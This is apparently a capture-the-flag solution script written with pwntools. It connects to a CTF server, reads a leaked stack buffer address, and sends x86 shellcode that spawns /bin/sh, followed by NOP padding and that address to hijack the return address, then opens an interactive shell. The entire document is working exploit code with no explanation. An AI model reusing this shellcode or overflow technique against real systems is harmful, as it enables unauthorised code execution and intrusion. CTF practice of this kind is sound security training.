from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3006)
p.recvuntil('Data : ')
p.sendline("AAAA")
buf_addr=int(p.recv(10),16)
p.recvuntil("Again (y/n)")
p.sendline("y")
p.recvuntil('Data : ')

payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload += b"\x90"*114
payload += p32(buf_addr)

p.sendline(payload)
p.interactive()
